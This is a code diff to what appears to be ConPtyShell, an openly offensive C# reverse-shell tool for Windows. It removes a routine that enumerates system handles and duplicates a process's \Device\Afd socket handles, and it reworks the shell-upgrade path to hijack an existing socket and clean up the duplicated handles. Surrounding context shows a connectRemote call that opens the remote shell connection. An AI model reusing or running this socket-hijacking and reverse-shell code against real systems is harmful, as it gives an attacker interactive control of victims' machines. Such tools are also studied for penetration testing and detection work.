@@ -336,82 +336,6 @@ public static class SocketHijacking {
 
         return IntPtr.Zero;
     }
-    
-   
-    
-    public static IntPtr GetSocketTargetProcess(Process targetProcess)
-    {
-        OBJECT_NAME_INFORMATION objNameInfo;
-        long HandlesCount = 0;
-        IntPtr dupHandle;
-        IntPtr ptrObjectName;
-        IntPtr ptrHandlesInfo;
-        IntPtr hTargetProcess;
-        string strObjectName;
-        IntPtr socketHandle = IntPtr.Zero;
-        DeadlockCheckHelper deadlockCheckHelperObj = new DeadlockCheckHelper();
-        
-        hTargetProcess = OpenProcess(ProcessAccessFlags.DuplicateHandle, false, targetProcess.Id);
-        if(hTargetProcess == IntPtr.Zero){
-            Console.WriteLine("Cannot open target process with pid " + targetProcess.Id.ToString() + " for DuplicateHandle access");
-            return socketHandle;
-        }
-
-        ptrHandlesInfo = NtQuerySystemInformationDynamic(SystemHandleInformation, 0);
-        HandlesCount = Marshal.ReadIntPtr(ptrHandlesInfo).ToInt64();
-        // create a pointer at the beginning of the address of SYSTEM_HANDLE_TABLE_ENTRY_INFO[]
-        IntPtr ptrHandlesInfoCurrent = new IntPtr(ptrHandlesInfo.ToInt64()+IntPtr.Size);
-        // get TypeIndex for "File" objects, needed to filter only sockets objects
-        byte TypeIndexFileObject = GetTypeIndexByName("File");
-        for(int i=0; i < HandlesCount; i++){
-            SYSTEM_HANDLE_TABLE_ENTRY_INFO sysHandle;
-            try {
-                sysHandle = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)Marshal.PtrToStructure(ptrHandlesInfoCurrent, typeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO));
-            }
-            catch {
-                break;
-            }
-            //move pointer to next SYSTEM_HANDLE_TABLE_ENTRY_INFO
-            ptrHandlesInfoCurrent = (IntPtr)(ptrHandlesInfoCurrent.ToInt64() + Marshal.SizeOf(new SYSTEM_HANDLE_TABLE_ENTRY_INFO()));
-            if (sysHandle.UniqueProcessId != targetProcess.Id || sysHandle.ObjectTypeIndex != TypeIndexFileObject)
-                continue;
-            if(DuplicateHandle(hTargetProcess, (IntPtr)sysHandle.HandleValue, GetCurrentProcess(), out dupHandle, 0, false, DUPLICATE_SAME_ACCESS)){
-                if(deadlockCheckHelperObj.CheckDeadlockDetected(dupHandle)){ // this will avoids deadlocks on special named pipe handles
-                    // Console.WriteLine("debug: Deadlock detected");
-                    CloseHandle(dupHandle);
-                    continue;
-                }
-                ptrObjectName = NtQueryObjectDynamic(dupHandle, OBJECT_INFORMATION_CLASS.ObjectNameInformation, 0);
-                if (ptrObjectName == IntPtr.Zero){
-                    CloseHandle(dupHandle);
-                    continue;
-                }
-                try {
-                    objNameInfo = (OBJECT_NAME_INFORMATION)Marshal.PtrToStructure(ptrObjectName, typeof(OBJECT_NAME_INFORMATION));
-                }
-                catch {
-                    continue;
-                }
-                if (objNameInfo.Name.Buffer != IntPtr.Zero && objNameInfo.Name.Length > 0)
-                {
-                    strObjectName = Marshal.PtrToStringUni(objNameInfo.Name.Buffer, objNameInfo.Name.Length / 2);
-                    // Console.WriteLine("debug: strObjectName " + strObjectName);
-                    if (strObjectName == "\\Device\\Afd") {
-                        socketHandle = dupHandle;
-                        break;
-                    }
-                    else
-                        CloseHandle(dupHandle);
-                }
-                Marshal.FreeHGlobal(ptrObjectName);
-                ptrObjectName = IntPtr.Zero;
-                CloseHandle(dupHandle);
-                }
-        }
-        Marshal.FreeHGlobal(ptrHandlesInfo);
-        return socketHandle;
-    }
-
 
     public static List<IntPtr> GetSocketsTargetProcess(Process targetProcess)
     {
@@ -1046,11 +970,12 @@ public static class ConPtyShell
         if(conptyCompatible){
             Console.WriteLine("\r\nCreatePseudoConsole function found! Spawning a fully interactive shell\r\n");
             if(upgradeShell){
+                List<IntPtr> socketsHandles = new List<IntPtr>();
                 currentProcess = Process.GetCurrentProcess();
                 parentProcess = ParentProcessUtilities.GetParentProcess(currentProcess.Handle);
                 grandParentProcess = ParentProcessUtilities.GetParentProcess(parentProcess.Handle);
-                shellSocket = SocketHijacking.GetSocketTargetProcess(currentProcess);
-                if(shellSocket != IntPtr.Zero){
+                socketsHandles = SocketHijacking.GetSocketsTargetProcess(currentProcess);
+                if(socketsHandles.Count > 0){
                     shellSocket = SocketHijacking.DuplicateTargetProcessSocket(currentProcess);
                     if(parentProcess != null)
                         parentSocketInherited = SocketHijacking.IsSocketInherited(shellSocket, parentProcess);
@@ -1058,7 +983,10 @@ public static class ConPtyShell
                 else
                     shellSocket = SocketHijacking.DuplicateTargetProcessSocket(parentProcess);
                 if(grandParentProcess != null)
-                    grandParentSocketInherited = SocketHijacking.IsSocketInherited(shellSocket, grandParentProcess);            
+                    grandParentSocketInherited = SocketHijacking.IsSocketInherited(shellSocket, grandParentProcess);
+                // cleaning all socket handles duplicated
+                foreach (IntPtr dupHandle in socketsHandles)
+                    CloseHandle(dupHandle);
             }
             else{
                 shellSocket = connectRemote(remoteIp, remotePort);
@@ -1102,7 +1030,6 @@ public static class ConPtyShell
             sInfo.hStdError = OutputPipeWrite;
             CreateProcessW(null, commandLine, IntPtr.Zero, IntPtr.Zero, true, 0, IntPtr.Zero, null, ref sInfo, out childProcessInfo);
         }
-
         // Note: We can close the handles to the PTY-end of the pipes here
         // because the handles are dup'ed into the ConHost and will be released
         // when the ConPTY is destroyed.
